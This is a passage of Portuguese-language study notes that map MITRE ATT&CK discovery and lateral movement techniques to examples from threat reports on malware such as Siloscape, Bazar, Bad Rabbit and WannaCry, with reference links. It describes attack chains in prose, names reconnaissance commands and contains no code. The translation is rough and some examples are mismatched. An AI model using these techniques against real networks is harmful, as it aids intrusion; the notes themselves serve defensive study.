**Exemplo de procedimento:** Hildegard usou masscan para procurar kubelets e a API kubelet para recipientes de execução adicionais:  Os atacantes ganharam acesso inicial através de um kubelet mal configurado que permitiu acesso anônimo. Uma vez que se baseou em um cluster Kubernetes, o malware tentou se espalhar pelo maior número possível de contêineres e, eventualmente, lançou operações de cryptojacking

**REFERÊNCIA:** https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/

T1482 **Descoberta de confiança de domínio:** Os atacantes podem coletar informações sobre relacionamento de confiança de dominio do windowns para ser usado em identificar oportunidades de movimento lateral em ambientes windowns. As informações descobertas poem ajudar os adversários a realizar a injeção SID-History

**Exemplo de procedimento:** O AdFind pode coletar informações sobre unidades organizacionais (OUs) e trusts de domínio do Active Directory: 

![image](https://user-images.githubusercontent.com/95362045/159918830-9f2d6ba4-3276-4803-a6cd-445f8a7e5263.png)

**REFERÊNCIA:** https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/

T1083 **Descoberta de arquivo e diretório:** Os atacantes podem enumerar arquivos e diretórios ou pode simplismente pesquisar em locais específicos de um host ou compartilhamento de rede para obter certas informações dentro de um sistema de arquivo

**Exemplo de procedimento:** O backdoor do APT32 possui a capacidade de listar arquivos e diretórios em uma máquina: 

**REFERÊNCIA:** https://www.welivesecurity.com/2019/03/20/fake-or-fake-keeping-up-with-oceanlotus-decoys/

T1615 **Descoberta de políticas de grupo:** Os adversários podem coletar informações sobre configurações de Políticas de Grupo para identificar caminhos para a escalada de privilégios, medidas de segurança aplicadas dentro de um domínio e descobrir padrões em objetos de domínio que podem ser manipulados ou usados para se misturar no ambiente. A Política de Grupo permite o gerenciamento centralizado das configurações de usuário e computador no Active Directory (AD).

**Exemplo de procedimento:** BloodHound tem a capacidade de coletar informações de administração local via GPO: BloodHound é um aplicativo web Javascript de uma única página, construído em cima do Linkurious, compilado com a Electron, com um banco de dados Neo4j alimentado por um coletor de dados C#.

BloodHound usa a teoria do gráfico para revelar as relações ocultas e muitas vezes não intencionais dentro de um ambiente Active Directory ou Azure. Os atacantes podem usar o BloodHound para identificar facilmente caminhos de ataque altamente complexos que de outra forma seriam impossíveis de identificar rapidamente. Os defensores podem usar o BloodHound para identificar e eliminar esses mesmos caminhos de ataque. Ambas as equipes azuis e vermelhas podem usar o BloodHound para obter facilmente uma compreensão mais profunda das relações de privilégio em um ambiente active directory ou azure.

**REFERÊNCIA:** https://github.com/BloodHoundAD/BloodHound

T1046 **Varredura de serviços de rede:** Os adversários podem tentar obter uma listagem de serviços em execução em hosts remotos, incluindo aqueles que podem ser vulneráveis à exploração remota de software. Os métodos para adquirir essas informações incluem varreduras de portas e varreduras de vulnerabilidade usando ferramentas que são trazidas para um sistema.

**Exemplo de procedimento:** A BlackEnergy realizou varreduras portuárias em um hospedeiro: O malware BlackEnergy é o crimeware que virou ferramenta APT e é usado em operações geopolíticas significativas levemente documentadas ao longo do último ano. Uma parte ainda mais interessante da história blackenergy são os recursos de plugin personalizados relativamente desconhecidos para atacar plataformas ARM e MIPS, scripts para dispositivos de rede Cisco, plugins destrutivos, um ladrão de certificados e muito mais. Aqui, apresentamos dados disponíveis – é difícil coletar neste APT. Também apresentaremos mais detalhes sobre alvos anteriormente indisponíveis e apresentaremos dados relacionados ao perfil da vítima.

**REFERÊNCIA:** https://securelist.com/be2-custom-plugins-router-abuse-and-target-profiles/67353/

T1135 **Descoberta de compartilhamento de rede:** Os adversários podem procurar pastas e unidades compartilhadas em sistemas remotos como forma de identificar fontes de informação para coletar como um precursor da Coleta e identificar potenciais sistemas de interesse para o Movimento Lateral

**Exemplo de procedimento:** O APT38 enumerou as ações da rede em um host comprometido: 
Os BeagleBoyz usam uma variedade de ferramentas e técnicas para obter acesso à rede de uma instituição financeira, aprender a topologia para descobrir sistemas-chave e monetizar seu acesso. A análise técnica abaixo representa uma amálgama de múltiplos incidentes conhecidos, em vez de detalhes de uma única operação. Esses achados são apresentados para destacar a capacidade do grupo de adaptar suas técnicas a diferentes alvos e adaptar seus métodos ao longo do tempo. Consequentemente, há a necessidade de mitigações em camadas para se defender efetivamente contra essa atividade, uma vez que depender apenas da detecção de assinaturas de rede não protegerá suficientemente contra o BeagleBoyz da Coreia do Norte.

**REFERÊNCIA:** https://www.cisa.gov/uscert/ncas/alerts/aa20-239a

T1040 **Sniffing de rede:** Os adversários podem farejar o tráfego da rede para capturar informações sobre um ambiente, incluindo material de autenticação passado sobre a rede. O sniffing de rede refere-se ao uso da interface de rede em um sistema para monitorar ou capturar informações enviadas por uma conexão com fio ou sem fio.Os dados capturados através desta técnica podem incluir credenciais de usuário, especialmente aquelas enviadas por meio de um protocolo inseguro e não criptografado

**Exemplo de procedimento:** MESSAGETAP usa a biblioteca libpcap para ouvir todos os protocolos de rede de tráfego e analisa os protocolos de rede começando com camadas Ethernet e IP. Ele continua analisando camadas de protocolo, incluindo SCTP, SCCP e TCAP e, finalmente, extrai dados de mensagens SMS e metadados de roteamento. 

**REFERÊNCIA:** https://www.mandiant.com/resources/messagetap-who-is-reading-your-text-messages

T1201 **Descoberta de políticas de senha:** Os adversários podem tentar acessar informações detalhadas sobre a política de senha usada em uma rede corporativa ou ambiente em nuvem. As políticas de senha são uma maneira de impor senhas complexas que são difíceis de adivinhar ou quebrar através da Força Bruta. Essas informações podem ajudar o adversário a criar uma lista de senhas comuns e lançar ataques de força e/ou força bruta que adere à política (por exemplo, se o comprimento mínimo da senha for 8, então não experimentar senhas como 'pass123'; não verificar mais de 3-4 senhas por conta se o bloqueio for definido como 6 para não bloquear contas)

**Exemplo de procedimento:** O BloodHound pode coletar informações sobre a política de senhas no ambiente de destino: 

**REFERÊNCIA:** https://www.crowdstrike.com/blog/hidden-administrative-accounts-bloodhound-to-the-rescue/

T1120 **Descoberta de dispositivo periférico:** Os adversários podem tentar coletar informações sobre dispositivos periféricos conectados e componentes conectados a um sistema de computador. Dispositivos periféricos podem incluir recursos auxiliares que suportam uma variedade de funcionalidades, como teclados, impressoras, câmeras, leitores de cartões inteligentes ou armazenamento removível. 

**Exemplo de procedimento:** Zebrocy enumera informações sobre dispositivos de armazenamento conectados.

**REFERÊNCIA:** https://unit42.paloaltonetworks.com/unit42-sofacy-continues-global-attacks-wheels-new-cannon-trojan/.

T1069 **Descoberta de grupos de permissão:** Os adversários podem tentar encontrar configurações de grupo e permissão. Essas informações podem ajudar os adversários a determinar quais contas e grupos de usuários estão disponíveis, a adesão de usuários em determinados grupos e quais usuários e grupos têm permissões elevadas.

**Exemplo de procedimento:** Siloscape verifica permissões de nó Kubernetes: O Siloscape é um malware fortemente ofuscado que visa clusters Kubernetes através de contêineres windows. Seu principal objetivo é abrir um backdoor em clusters Kubernetes mal configurados, a fim de executar contêineres maliciosos.O Siloscape usa o proxy Tor e um domínio .onion para conectar anonimamente ao seu servidor de comando e controle (C2). Consegui ter acesso a esse servidor

![image](https://user-images.githubusercontent.com/95362045/160623159-6347e8d6-179d-4d57-89b2-a9eada745437.png)

- O invasor consegue execução remota de código (RCE) dentro de um contêiner do Windows usando uma vulnerabilidade conhecida ou uma página ou banco de dados vulnerável.
- O invasor executa o Siloscape (CloudMalware.exe) com as informações necessárias de conexão C2 fornecidas como argumentos de linha de comando (e não codificadas no interior do binário).
- Siloscape personifica CExecSvc.exe para obter privilégios SeTcbPrivilege (esta técnica é descrita em detalhes no meu artigo anterior).
- O Siloscape cria um link simbólico global ao host, praticamente ligando sua unidade X contêiner à unidade C do host.
- O Siloscape procura o kubectl.exe binário pelo nome e o arquivo Kubernetes config por expressão regular no host, usando o link global.
- O Siloscape verifica se o nó comprometido tem privilégio suficiente para criar novas implantações kubernetes.
- O Siloscape extrai o cliente Tor para o disco a partir de um arquivo arquivado usando um binário descompactado. Ambos os arquivos estão embalados no binário Siloscape principal.
- O Siloscape se conecta à rede Tor. Usando o argumento da linha de comando fornecido, o Siloscape descriptografa a senha do servidor C2.
- O Siloscape se conecta ao servidor C2 usando um domínio .onion (um domínio acessível através da rede Tor) fornecido como um argumento de linha de comando.
Siloscape aguarda por comandos do C2 e executa-os.

**REFERÊNCIA:** https://unit42.paloaltonetworks.com/siloscape/

.001 **Grupos Locais:**  O conhecimento dos grupos locais de permissão do sistema pode ajudar os adversários a determinar quais grupos existem e quais usuários pertencem a um determinado grupo. Os adversários podem usar essas informações para determinar quais usuários têm permissões elevadas, como os usuários encontrados no grupo de administradores locais.

**Exemplo de procedimento:** O BloodHound pode coletar informações sobre grupos locais e membros: BloodHound é um aplicativo web JavaScript de uma única página com um banco de dados Neo4j que é alimentado por um script PowerShell. BloodHound usa a teoria do gráfico para revelar relações ocultas e muitas vezes não intencionais dentro de um ambiente da AD

**REFERÊNCIA:** https://www.crowdstrike.com/blog/hidden-administrative-accounts-bloodhound-to-the-rescue/

.002 **Grupos de domínio:** O conhecimento de grupos de permissão em nível de domínio pode ajudar os adversários a determinar quais grupos existem e quais usuários pertencem a um determinado grupo. Os adversários podem usar essas informações para determinar quais usuários têm permissões elevadas, como administradores de domínio.

**Exemplo de procedimento:** O AdFind pode enumerar grupos de domínio: O acesso inicial veio por meio de um e-mail de phishing contendo um anexo PDF. O usuário abriu esse anexo e clicou em um link no PDF, que se conectou ao Google Drive e baixou um arquivo, Este é conhecido como Bazar, que tem diferentes componentes conhecidos pela comunidade como BazaLoader, BazarLoader e BazarBackdoor.Report[mm]-[dd].exeReport10-29.exe.exe

**REFERÊNCIA:** https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/

.003 **Grupos de nuvem:**  O conhecimento de grupos de permissão em nuvem pode ajudar os adversários a determinar as funções particulares dos usuários e grupos dentro de um ambiente, bem como quais usuários estão associados a um determinado grupo.

**Exemplo de procedimento:** Os adversários podem tentar listar ACLs para objetos para determinar o proprietário e outras contas com acesso ao objeto, por exemplo, através da API AWS GetBucketAcl. Usando essas informações, um adversário pode direcionar contas com permissões para um determinado objeto ou aproveitar contas que já comprometeram para acessar o objeto.

**REFERÊNCIA:** https://docs.aws.amazon.com/AmazonS3/latest/API/API_GetBucketAcl.html

T1057 **Descoberta de processos:** As informações obtidas poderiam ser usadas para obter uma compreensão de software/aplicativos comuns em execução em sistemas dentro da rede. Os adversários podem usar as informações do Process Discovery durante a descoberta automatizada para moldar comportamentos de seguimento, incluindo se o adversário infecta totalmente o alvo e/ou tenta ações específicas.

**Exemplo de procedimento:** Agente Tesla pode listar os processos atuais em execução no sistema: O malware foi espalhado através de um documento do Microsoft Word que continha um VBA Macro malicioso auto-executáve. Depois de clicar no botão "Ativar conteúdo", o VBA Macro malicioso é executado secretamente em segundo plano. O código primeiro grava alguns valores-chave no registro do sistema do dispositivo para evitar o aviso de segurança Macro ao abrir documentos do Word com conteúdo arriscado na próxima vez.

**REFERÊNCIA:** https://www.fortinet.com/blog/threat-research/in-depth-analysis-of-net-malware-javaupdtr

T1012 **Registro de consulta:** O Registro contém uma quantidade significativa de informações sobre o sistema operacional, configuração, software e segurança. As informações podem ser facilmente consultadas usando o utilitário Reg, embora existam outros meios para acessar o Registro. Algumas das informações podem ajudar os adversários a continuar sua operação dentro de uma rede. Os adversários podem usar as informações do Registro de Consulta durante a descoberta automatizada para moldar comportamentos de seguimento, incluindo se o adversário infecta totalmente o alvo e/ou tenta ações específicas.

**Exemplo de procedimento:** O carbono enumera valores no Registro: O grupo Turla é conhecido por ser minucioso e trabalhar em etapas, primeiro fazendo reconhecimento nos sistemas de suas vítimas antes de implantar suas ferramentas mais sofisticadas, como o Carbon.

A estrutura de Carbono consiste em:

- Um executor que instala os componentes de carbono e seu arquivo de configuração
- Um componente que se comunica com o C&C
- Um orquestrador que lida com as tarefas, despacha-as para outros computadores na rede e injeta em um processo legítimo o DLL que se comunica com o C&C
- Um carregador que executa o orquestrador

**REFERÊNCIA:** https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/

T1018 **Descoberta remota do sistema:** Os adversários podem tentar obter uma listagem de outros sistemas por endereço IP, nome de host ou outro identificador lógico em uma rede que pode ser usada para movimento lateral do sistema atual

**Exemplo de procedimento:** O BitPaymer pode usar para descobrir sistemas remotos.net view: 
![image](https://user-images.githubusercontent.com/95362045/160641852-f9592123-32fe-43b9-8580-373e2a77103b.png)

o vetor inicial de infecção a atualizações falsas para um plugin FlashPlayer e o navegador Chrome. Essas atualizações falsas são servidas através de sites legítimos que foram comprometidos, e usam a engenharia social para enganar os usuários para baixar e executar um executável malicioso. Essas campanhas falsas de atualização parecem ser um serviço de pay-per-install que é simplesmente usado pelo INDRIK SPIDER para fornecer seu malware

**REFERÊNCIA:** https://www.crowdstrike.com/blog/big-game-hunting-the-evolution-of-indrik-spider-from-dridex-wire-fraud-to-bitpaymer-targeted-ransomware/

T1518 **Descoberta de software:** Os adversários podem tentar obter uma listagem de versões de software e software que estão instaladas em um sistema ou em um ambiente de nuvem. Os adversários podem usar as informações do Software Discovery durante a descoberta automatizada para moldar comportamentos de seguimento, incluindo se o adversário infecta totalmente o alvo e/ou tenta ações específicas.

**Exemplo de procedimento:** O Bazar pode consultar o Registro de aplicativos instalados: O carregador bazar dá ao atacante sua base inicial no ambiente, enquanto o backdoor bazar estabelece persistência. Juntos, o carregador e o backdoor dão aos atores de ameaças a oportunidade de implantar outras cargas, como ransomware, e estruturas pós-exploração, como o CobaltStrike, bem como exfiltrar dados e executar remotamente comandos em máquinas infectadas. O backdoor bazar pode levar a uma continuidade de negócios interrompida, perda de dados e comprometimento total, minando a confiança em uma organização.

![image](https://user-images.githubusercontent.com/95362045/160646948-41cf13d1-8555-4a6e-9f87-638113b6412f.png)

![image](https://user-images.githubusercontent.com/95362045/160646654-3d7e45d7-8c7e-4d92-9177-74b53eb98df0.png)

**REFERÊNCIA:** https://www.cybereason.com/blog/a-bazar-of-tricks-following-team9s-development-cycles

.001 **Descoberta de software de segurança:** Os adversários podem tentar obter uma listagem de software de segurança, configurações, ferramentas defensivas e sensores que estão instalados em um sistema ou em um ambiente de nuvem. Isso pode incluir coisas como regras de firewall e antivírus. Os adversários podem usar as informações do Security Software Discovery durante a descoberta automatizada para moldar comportamentos de seguimento, incluindo se o adversário infecta totalmente o alvo e/ou tenta ações específicas.

**Exemplo de procedimento:** Astaroth verifica a presença do antivírus Avast na pasta. C:\Program\Files\: Astaroth é conhecida por infectar vítimas através de e-mails falsos de fatura, a maioria dos quais se originam de um remetente malicioso se passando por serviços legítimos usando domínios cam.br.

A carga inicial da Astaroth é um arquivo .lnk malicioso, um método de entrega comum usado por atores de ameaças. Arquivos .lnk maliciosos contêm um link para uma URL (em vez do URI local esperado) para pegar a próxima carga útil. Depois que o malware for baixado e os arquivos verificados, o script será verificado no diretório C:\Program Files\ para a presença do antivírus Avast, que passa a ser o AV instalado mais comum em todo o mundo.


**REFERÊNCIA:** https://cofense.com/seeing-resurgence-demonic-astaroth-wmic-trojan/

T1082 **Descoberta de informações do sistema:** Um adversário pode tentar obter informações detalhadas sobre o sistema operacional e o hardware, incluindo versão, patches, hotfixes, pacotes de serviço e arquitetura. Os adversários podem usar as informações da Detecção de Informações do Sistema durante a descoberta automatizada para moldar comportamentos de seguimento, incluindo se o adversário infecta totalmente o alvo e/ou tenta ações específicas.

**Exemplo de procedimento:** O malware é lançado executando o HTA de primeiro estágio a partir de um local remoto, assim ele pode ser entregue através de diferentes tipos de arquivos, incluindo arquivos PE, bem como documentos maliciosos. Ele exfiltra informações do sistema para o servidor C2, mantém a persistência no sistema e aguarda instruções adicionais do operador. A figura 1, abaixo, mostra o fluxo de execução.

![image](https://user-images.githubusercontent.com/95362045/160648286-68839b0d-e45d-46c9-a1cf-fc62e9d9a7ef.png)

**REFERÊNCIA:** https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/

T1614 **Descoberta de localização do sistema:** Os adversários podem coletar informações na tentativa de calcular a localização geográfica de um hospedeiro da vítima. Os adversários podem usar as informações da Detecção de Localização do Sistema durante a descoberta automatizada para moldar comportamentos de seguimento, incluindo se o adversário infecta totalmente o alvo e/ou tenta ações específicas. Os adversários podem tentar inferir a localização de um sistema usando várias verificações do sistema, como fuso horário, layout do teclado e/ou configurações de idioma

**Exemplo de procedimento:** Crimson pode identificar a localização geográfica de um hospedeiro da vítima: Os atacantes usam uma ferramenta chamada Crimson, ela é composta por vários componentes que são usados pelo invasor para realização de múltiplas atividades em máquinas infectadas. isso inclui.

- gerenciar sistemas de arquivos remotos
- carregar ou baixar arquivos
- capturar capturas de tela
- executar vigilância de áudio usando microfones
- gravar fluxos de vídeo de dispositivos webcam
- capturar capturas de tela
- roubar arquivos de mídia removível
- executar comandos arbitrários
- gravar teclas
- roubar senhas salvas em navegadores
- espalhados por sistemas infectando mídia removível

**REFERÊNCIA:** https://securelist.com/transparent-tribe-part-1/98127/

.001 **Descoberta da linguagem do sistema:** ssas informações podem ser usadas para moldar comportamentos de seguimento, incluindo se o adversário infecta o alvo e/ou tenta ações específicas. Essa decisão pode ser empregada por desenvolvedores e operadores de malware para reduzir o risco de atrair a atenção de agências específicas de aplicação da lei ou acusação/escrutínio de outras entidades.

**Exemplo de procedimento:** O DropBook verificou a presença da língua árabe nas configurações da máquina infectada: O ataque começa com um e-mail atraindo figuras políticas ou funcionários do governo no Oriente Médio (Territórios Palestinos, Emirados Árabes Unidos, Egito, Turquia) para baixar documentos maliciosos. ntregavam o novo malware foi um arquivo PDF referente às recentes conversações entre o primeiro-ministro israelense Benjamin Netanyahu e sua Alteza Real Mohammed bin Salman. Dois desses arquivos eram SharpStage e DropBook backdoors, que chamavam um armazenamento Dropbox controlado pelo invasor para baixar outros malwares. Um terceiro foi outro backdoor, Spark, também usado por Molerats em campanhas anteriores.

![image](https://user-images.githubusercontent.com/95362045/161053308-2c6d0452-7293-422c-bdde-74d77bd9e6f2.png)

**REFERÊNCIA:** https://www.bleepingcomputer.com/news/security/hacking-group-s-new-malware-abuses-google-and-facebook-services/

T1016 **Detecção de configuração da rede do sistema:** Os adversários podem procurar detalhes sobre a configuração e configurações da rede, como endereços IP e/ou MAC, de sistemas que acessam ou através da detecção de informações de sistemas remotos. 

**Exemplo de procedimento:**  A âncora pode determinar o IP público e a localização de um host comprometido.: Este malware é um backdoor Linux leve. Após a execução, ele se instala como um trabalho de cron, determina o ip público para o host e, em seguida, começa a farol via consultas DNS para o seu servidor C2.

**REFERÊNCIA:** https://medium.com/stage-2-security/anchor-dns-malware-family-goes-cross-platform-d807ba13ca30

.001 **Descoberta de conexão à Internet:** Os adversários podem verificar a conectividade com a Internet em sistemas comprometidos. Isso pode ser realizado durante a descoberta automatizada e pode ser realizado de várias maneiras, como o uso de ping, e solicitações GET para sites

**Exemplo de procedimento:** QakBot pode medir a velocidade de download em um host direcionado:  A QakBot é conhecida por infectar suas vítimas principalmente através de campanhas de spam. Em alguns casos, os e-mails foram entregues com documentos do Microsoft Office (Word, Excel) ou arquivos protegidos por senha com os documentos anexados. Os documentos continham macros e as vítimas foram solicitadas a abrir os anexos com alegações de que continham informações importantes (por exemplo, uma nota fiscal). Em alguns casos, os e-mails continham links para páginas da Web distribuindo documentos maliciosos.

![image](https://user-images.githubusercontent.com/95362045/161067143-31305f10-d6b7-416b-a4df-dcdc1b225f90.png)

**REFERÊNCIA:** https://securelist.com/qakbot-technical-analysis/103931/

T1049 **Descoberta de conexões de rede do sistema:** Os adversários podem tentar obter uma listagem de conexões de rede para ou a partir do sistema comprometido que estão acessando atualmente ou a partir de sistemas remotos, consultando informações na rede.

**Exemplo de referência:** O APT3 possui uma ferramenta que pode enumerar conexões de rede atuais: usou e-mails de phishing com um anexo .zip malicioso. O arquivo .zip anexado ao e-mail contém um arquivo de atalho do Windows (.lnk) com o logotipo do Microsoft Internet Explorer. Clicar no atalho acaba levando o Backdoor.Pirpi a ser baixado e executado no computador afetado. O Buckeye usa o Backdoor.Pirpi, um Trojan de acesso remoto capaz de ler, escrever e executar arquivos e programas. O Backdoor.Pirpi também coleta informações sobre a rede local do alvo, incluindo o controlador de domínio e as estações de trabalho.

**REFERÊNCIA:** https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=92a4528c-2bdb-498f-85c8-4273bfdc66aa&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments

T1033 **Detecção do proprietário/usuário do sistema:** Os adversários podem tentar identificar o usuário principal, atualmente conectado ao usuário, conjunto de usuários que comumente usa um sistema ou se um usuário está usando ativamente o sistema. Eles podem fazer isso, por exemplo, recuperando nomes de usuário de contas ou usando o Dumping credencial do OS.

**Exemplo de procedimento:** Agente Tesla pode coletar o nome de usuário da máquina da vítima: Agente Tesla é um pedaço relativamente novo de malware usado para rastrear teclas no computador da vítima. O malware pode ser usado secretamente por adversários para coletar informações da conta, nomes de usuário, senhas e números de cartão de crédito. Embora os keyloggers não sejam construídos para extrair arquivos ou fornecer remotamente acesso a um sistema, qualquer informação digitada em documentos, navegadores ou aplicativos de mensagens pode ser registrada. Os atores de ameaças podem tirar "instantâneos" de teclas e ver tudo o que foi digitado, pesquisado ou acessado. Embora o Agente Tesla possa executar funções padrão de keylogging, ele também tem recursos que o diferenciam de peças semelhantes de malware.

Modo de infecção: A entrega do Agente Tesla no computador da vítima é muitas vezes realizada através de phishing ou envio de e-mails com um anexo infectado.

**REFERÊNCIA:** https://www.digitrustgroup.com/agent-tesla-keylogger/

T1007 **Descoberta de serviço de sistema:** Os adversários podem tentar obter informações sobre serviços registrados. Os comandos que podem obter informações sobre serviços usando utilitários do sistema operacional são "sc", "tasklist /svc" usando Tasklist e "net start" usando o Net, mas os adversários também podem usar outras ferramentas. 

**Exemplo de procedimento:** Os adversários podem usar as informações do System Service Discovery durante a descoberta automatizada para moldar comportamentos de seguimento, incluindo se o adversário infecta totalmente o alvo e/ou tenta ações específicas.

T1124 **Descoberta de tempo do sistema:** Um adversário pode reunir a hora e/ou fuso horário do sistema de um sistema local ou remoto. O tempo do sistema é definido e armazenado pelo Windows Time Service dentro de um domínio para manter a sincronização de tempo entre sistemas e serviços em uma rede corporativa.

**Exemplo de procedimento:** Astaroth coleta o estamp de tempo da máquina infectada. : A carga inicial da Astaroth é um arquivo .lnk malicioso, um método de entrega comum usado por atores de ameaças. Arquivos .lnk maliciosos contêm um link para uma URL (em vez do URI local esperado) para pegar a próxima carga útil.

**REFERÊNCIA:** https://cofense.com/seeing-resurgence-demonic-astaroth-wmic-trojan/

T1497 **Evasão de caixa de virtualização/caixa de areia:** Os adversários podem empregar vários meios para detectar e evitar ambientes de virtualização e análise. Isso pode incluir mudanças de comportamento com base nos resultados de verificações para a presença de artefatos indicativos de um ambiente de máquina virtual (VME) ou caixa de areia.

**Exemplo de procedimento:** Verificações bisonais se o malware foi executado dentro de um ambiente VMware: Uma vez que o malware começa, ele tenta alcançar um C2 codificado. A comunicação ocorre usando o protocolo baseado em HTTP não modificado, o corpo de solicitação e resposta são criptografados pelo RC4 e a chave de criptografia também é codificada na amostra. Como o resultado da criptografia RC4 pode conter dados binários, o malware também codifica-os no BASE64, para corresponder à especificação HTTP. O aperto de mão consiste em várias etapas: solicitação inicial, detalhes da rede da vítima e um pedido de informações mais detalhado da vítima. Esta é a lista completa de informações específicas da vítima que são enviadas ao C2 durante as etapas de aperto de mão:

- Endereço hostname, IP e MAC;
- Versão do Windows;
- Tempo definido no hospedeiro infectado;
- Sinalizadores que indicam se o malware foi executado no ambiente VMware;
- Bandeira de uso proxy;
- Identificador de página de código padrão do sistema;

**REFERÊNCIA:** https://securelist.com/cactuspete-apt-groups-updated-bisonal-backdoor/97962/

TA0008 **MOVIMENTAÇÃO LATERAL:**

O adversário está tentando se mover pelo seu ambiente.

O Movimento Lateral consiste em técnicas que os adversários usam para entrar e controlar sistemas remotos em uma rede. Seguir em frente em seu objetivo principal muitas vezes requer explorar a rede para encontrar seu alvo e, posteriormente, obter acesso a ela. Atingir seu objetivo muitas vezes envolve pivotar através de vários sistemas e contas a ganhar. Os adversários podem instalar suas próprias ferramentas de acesso remoto para realizar o Movimento Lateral ou usar credenciais legítimas com ferramentas nativas de rede e sistema operacional, que podem ser mais furtivas.

T1210 **Exploração de Serviços Remotos:** Os adversários podem explorar serviços remotos para obter acesso não autorizado a sistemas internos uma vez dentro de uma rede. A exploração de uma vulnerabilidade de software ocorre quando um adversário se aproveita de um erro de programação em um programa, serviço ou dentro do próprio software do sistema operacional ou do próprio kernel para executar código controlado por adversários. 

**Exemplo de procedimento:** 	Bad Rabbit usou a exploração EternalRomance SMB para se espalhar através das redes das vítimas: O ransomware foi distribuído com a ajuda de ataques drive-by. Enquanto o alvo está visitando um site legítimo, um invasor de malware está sendo baixado da infraestrutura do ator de ameaças. De acordo com nossa telemetria, o ransomware é espalhado através de um ataque drive-by.

O caixa de vítimas do ransomware é distribuído a partir de hxxp://1dnscontrol[.] com/flash_install.php

![image](https://user-images.githubusercontent.com/95362045/161280063-b6af62c8-18f2-4cb7-877f-6b08a43637e8.png)
O arquivo baixado chamado install_flash_player.exe precisa ser lançado manualmente pela vítima. Para operar corretamente, precisa de privilégios administrativos elevados que tenta obter usando o prompt UAC padrão. Se iniciado, ele salvará o DLL malicioso como C:Windowsinfpub.dat e o iniciará usando rundll32.

![image](https://user-images.githubusercontent.com/95362045/161280110-2eb31d67-513e-442a-b27f-28263ef4c00a.png)

**REFERÊNCIA:** https://securelist.com/bad-rabbit-ransomware/82851/

T1534 **Spearphishing interno:** O spearphishing interno é um ataque multi-encenado onde uma conta de e-mail é propriedade do controle do dispositivo do usuário com malware previamente instalado ou comprometendo as credenciais da conta do usuário. Os adversários tentam tirar vantagem de uma conta interna confiável para aumentar a probabilidade de enganar o alvo para cair na tentativa de phish.

**Exemplo de procedimento:** Leviatã tem conduzido spearphishing interno dentro do ambiente da vítima para movimento lateral. Para realização de spearphishing foi usado anexos maliciosos aos vários email a fim do cliente realizar uma execução, o script realiza buscas de vulnerabilidades assim que executado.

**RFERÊNCIA:** https://www.cisa.gov/uscert/ncas/alerts/aa21-200a

T1570 **Transferência lateral de ferramentas:** Os adversários podem transferir ferramentas ou outros arquivos entre sistemas em um ambiente comprometido. Os arquivos podem ser copiados de um sistema para outro para encenar ferramentas adversárias ou outros arquivos ao longo de uma operação.

**Exemplo de procedimento:** Quimera copiou ferramentas entre hosts comprometidos usando SMB: o adversário despeja as credenciais de administrador de domínio da memória desta máquina, continua se movendo lateralmente através da rede e coloca os faróis Cobalt Strike nos servidores para maior acesso persistente à rede da vítima. Se a rede da vítima contiver outros domínios do Windows ou diferentes zonas de segurança de rede, o adversário digitaliza e encontra as relações de confiança e os hosts de salto, tentando se mover para outros domínios e zonas de segurança. O adversário é tipicamente capaz de executar todas as etapas descritas acima dentro de um dia.

**REFERÊNCIA:** https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/

T1563 **Sequestro de sessão de serviço remoto:** Os usuários podem usar credenciais válidas para fazer login em um serviço especificamente projetado para aceitar conexões remotas, como telnet, SSH e RDP. Quando um usuário faz login em um serviço, uma sessão será estabelecida que permitirá que ele mantenha uma interação contínua com esse serviço.

**Exemplo de procedimento:** Os adversários podem comandar essas sessões para realizar ações em sistemas remotos. O sequestro de sessão de serviço remoto difere do uso de Serviços Remotos porque ele sequestra uma sessão existente em vez de criar uma nova sessão usando Contas Válidas

**REFERÊNCIA:** https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6?gi=6a1f6cf60a0

.001 **Sequestro ssh:** Os adversários podem sequestrar a sessão SSH de um usuário legítimo para se mover lateralmente dentro de um ambiente. Secure Shell (SSH) é um meio padrão de acesso remoto em sistemas Linux e macOS. Ele permite que um usuário se conecte a outro sistema através de um túnel criptografado, comumente autenticando através de uma senha, certificado ou o uso de um par de chaves de criptografia assimétrica.

**Exemplo de procedimento:** os adversários podem tirar proveito das relações de confiança estabelecidas com outros sistemas através da autenticação de chave pública em sessões de SSH ativas, sequestrando uma conexão existente para outro sistema. Isso pode ocorrer comprometendo o próprio agente SSH ou tendo acesso à tomada do agente. Se um adversário é capaz de obter acesso raiz, então sequestrar sessões SSH é provavelmente trivial.

**REFERÊNCIA:** https://www.slideshare.net/morisson/mistrusting-and-abusing-ssh-13526219

.002 **Sequestro rdp:** Os adversários podem realizar o sequestro de sessão RDP que envolve roubar a sessão remota de um usuário legítimo. Normalmente, um usuário é notificado quando outra pessoa está tentando roubar sua sessão. Com as permissões do Sistema e o uso do Console de Serviços de Terminal, um adversário pode sequestrar uma sessão sem a necessidade de credenciais ou solicitações ao usuário

**Exemplo de procedimento:** O WannaCry enumera as sessões de desktop remotas atuais e tenta executar o malware em cada sessão. A exploração usada, chamada EternalBlue, explora uma vulnerabilidade no protocolo Server Message Block (SMB), que permite que o malware se espalhe para todos os sistemas Windows não recompondo de XP a 2016 em uma rede que tenha esse protocolo ativado. Essa vulnerabilidade permite a execução remota de código sobre O SMB v1. O WannaCry utiliza essa exploração criando uma solicitação de sessão SMB personalizada com valores codificados com base no sistema de destino. Notavelmente, após o primeiro pacote SMB enviado para o endereço IP da vítima, o malware envia dois pacotes adicionais para a vítima contendo os endereços IP codificados 192.168.56.20 e 172.16.99.5. Uma regra de consulta do LogRhythm Network Monitoring (NetMon) para detectar esse tráfego está incluída no final deste relatório.

**REFERÊNCIA:** https://logrhythm.com/blog/a-technical-analysis-of-wannacry-ransomware/

T1021 **Serviços remotos:** Os adversários podem usar contas válidas para fazer login em um serviço especificamente projetado para aceitar conexões remotas, como telnet, SSH e VNC. O adversário pode, então, executar ações como usuário conectado.

